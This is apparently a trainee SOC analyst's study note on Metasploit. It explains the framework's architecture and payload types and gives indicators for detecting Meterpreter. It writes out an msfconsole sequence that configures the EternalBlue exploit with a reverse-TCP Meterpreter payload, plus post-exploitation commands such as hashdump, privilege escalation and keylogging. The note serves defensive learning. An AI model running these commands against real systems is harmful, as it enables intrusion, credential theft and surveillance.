# Metasploit Basics: Understanding Attacker Tools as a Defender
**Date:** June 25, 2026  
**Goal:** Understand Metasploit from a Blue Team perspective — know what attackers use so you can detect it

---

## 1. What is Metasploit?

Metasploit Framework is the world's most widely used penetration testing
framework. It provides ready-made exploits, payloads, and auxiliary tools
that attackers and pentesters use to compromise systems.

As a SOC analyst we need to understand Metasploit because:
- Knowing attacker tools = knowing what IOCs to look for
- Meterpreter leaves specific signatures in logs and network traffic
- Many real-world attacks use Metasploit modules
- Interview questions often ask "how would you detect a Meterpreter shell?"

> Legal reminder: Only use Metasploit against systems you own or
> have explicit written permission to test. Use TryHackMe VMs only.

---

## 2. Metasploit Architecture

```
Metasploit Framework
├── Exploits        → Code that takes advantage of a vulnerability
├── Payloads        → Code that runs AFTER successful exploitation
│   ├── Singles     → Self-contained payload (one action)
│   ├── Stagers     → Small payload that downloads larger payload
│   └── Stages      → Downloaded by stager (e.g. Meterpreter)
├── Auxiliaries     → Scanners, fuzzers, sniffers (no exploitation)
├── Post            → Post-exploitation modules (run after compromise)
├── Encoders        → Obfuscate payload to avoid AV detection
└── NOPs            → No-operation sleds for buffer overflows
```

---

## 3. Essential msfconsole Commands

```bash
# Start Metasploit console
msfconsole

# Get help
help

# Search for a module
search eternalblue
search ms17-010
search type:exploit platform:windows

# Use a module
use exploit/windows/smb/ms17_010_eternalblue

# Show module information
info

# Show required options
show options

# Set options
set RHOSTS 10.10.x.x        # Target IP
set LHOST 10.10.x.x         # Your IP (attacker)
set LPORT 4444              # Your listening port
set payload windows/x64/meterpreter/reverse_tcp

# Run the exploit
run
exploit

# Show available payloads for current module
show payloads

# Search for auxiliary scanners
search type:auxiliary name:smb

# Use SMB EternalBlue scanner (no exploitation — just check)
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 10.10.x.x
run

# Go back to main menu
back

# Show all sessions (active connections)
sessions

# Interact with a session
sessions -i 1

# Exit msfconsole
exit
```

---

## 4. Payload Types — Singles vs Stagers vs Stages

```
# Singles (inline) — self contained, larger size
windows/shell_reverse_tcp       → Opens cmd.exe reverse shell

# Stagers/Stages — two part delivery
windows/meterpreter/reverse_tcp → Stager downloads Meterpreter stage

# Naming convention:
# windows/meterpreter/reverse_tcp    → staged (uses /)
# windows/meterpreter_reverse_tcp    → stageless (no /)

# Connection directions:
# reverse_tcp  → Target connects BACK to attacker (bypasses firewall)
# bind_tcp     → Attacker connects TO target (needs open port)
# reverse_http → Target connects back over HTTP (blends with web traffic)
# reverse_https → Same but encrypted — harder to detect
```

---

## 5. Meterpreter — The Most Dangerous Payload

Meterpreter is Metasploit's advanced payload that runs entirely in memory,
making it harder to detect than traditional shells.

```
# What Meterpreter can do after compromise:
sysinfo                    # Get system information
getuid                     # Get current user
getsystem                  # Attempt privilege escalation to SYSTEM
hashdump                   # Dump password hashes
shell                      # Drop into system shell
upload file.exe            # Upload file to target
download file.txt          # Download file from target
screenshot                 # Take screenshot of target desktop
keyscan_start              # Start keylogger
keyscan_dump               # Dump captured keystrokes
run post/windows/gather/enum_logged_on_users   # Find logged on users
run post/multi/recon/local_exploit_suggester   # Find local privesc exploits
migrate PID                # Migrate to another process (hide in explorer.exe)
```

---

## 6. Detecting Metasploit/Meterpreter as a SOC Analyst

### Network IOCs

```
# Meterpreter default port
Port 4444 outbound connection = classic Meterpreter reverse shell

# In Wireshark — Meterpreter traffic looks like:
# Regular HTTPS traffic BUT to unusual IPs
# Filter: tcp.port == 4444
# Filter: tcp.port == 443 and ip.dst != known_good_IPs

# In netstat/ss output on compromised Linux host:
ss -tulnp | grep 4444
netstat -an | grep ESTABLISHED | grep 4444
```

### Process IOCs

```bash
# Meterpreter often hides in legitimate processes
# Check for unusual parent-child process relationships
ps aux | grep -E "explorer|svchost|notepad" 

# Meterpreter migrates into processes like:
# explorer.exe, svchost.exe, notepad.exe, calc.exe

# Suspicious: powershell.exe spawned by Word/Excel
# Suspicious: cmd.exe with no parent or unusual parent
```

### Log IOCs

```
# Windows Event Logs (Meterpreter indicators):
Event ID 4688  → New process created (look for unusual processes)
Event ID 4624  → Successful logon (check for new accounts)
Event ID 7045  → New service installed (persistence)

# Linux auth.log indicators:
grep "bash" /var/log/auth.log       # Shell spawned
grep "nc\|netcat" /var/log/auth.log # Netcat usage
grep "python" /var/log/auth.log     # Python shell
```

### File System IOCs

```bash
# Metasploit drops files in predictable locations
ls -la /tmp/                        # Check temp directory
ls -la /var/tmp/                    # Another common drop location
find / -name "*.elf" -newer /etc/passwd 2>/dev/null  # New ELF files
find /tmp -executable 2>/dev/null   # Executables in /tmp = red flag
```

---

## 7. Common Metasploit Modules SOC Analysts Should Know

```
# EternalBlue — most famous exploit
exploit/windows/smb/ms17_010_eternalblue
# Targets: Windows 7, Server 2008 with SMB port 445 open
# IOC: Sudden SMB traffic spike, port 445 connections

# EternalBlue Scanner — check without exploiting
auxiliary/scanner/smb/smb_ms17_010
# Used by defenders to audit their own network

# SMB Login Brute Force
auxiliary/scanner/smb/smb_login
# IOC: Many failed SMB authentication attempts in logs

# Port Scanner
auxiliary/scanner/portscan/tcp
# IOC: Sequential port connections from single IP

# FTP Brute Force
auxiliary/scanner/ftp/ftp_login
# IOC: Many failed FTP login attempts in logs

# HTTP Directory Scanner
auxiliary/scanner/http/dir_scanner
# IOC: Many 404 errors from single IP in Apache logs
```

---

## 8. Metasploit vs Manual Exploitation — Key Differences

| Feature | Metasploit | Manual Exploitation |
|---|---|---|
| Speed | Very fast | Slow |
| Skill needed | Low — point and click | High |
| Detection | Known signatures | Harder to detect |
| Flexibility | Module dependent | Fully customizable |
| Used by | Script kiddies + pros | Advanced attackers |
| IOCs | Predictable (port 4444) | Varies widely |

> SOC tip: If you see port 4444 in outbound connections or netstat,
> that system should be immediately isolated for investigation.
> Metasploit's default configuration is very noisy — easy to detect
> if you know what to look for.

---

## 9. Key Takeaways for SOC Work

- Metasploit knowledge = better defender — know your enemy
- Port 4444 outbound = Meterpreter reverse shell until proven otherwise
- Meterpreter runs in memory — check processes, not just files
- reverse_https payloads blend with normal HTTPS — harder to detect
- EternalBlue (MS17-010) is still being used in 2026 — patch SMBv1
- Process migration makes Meterpreter look like legitimate software
- Always isolate and investigate any system with port 4444 connections

---

## TryHackMe
- [x] Metasploit: Introduction room — completed

## Commands Practiced Today

```bash
# msfconsole session
msfconsole
search eternalblue
use auxiliary/scanner/smb/smb_ms17_010
show options
set RHOSTS 10.10.x.x
run
back
exit
```

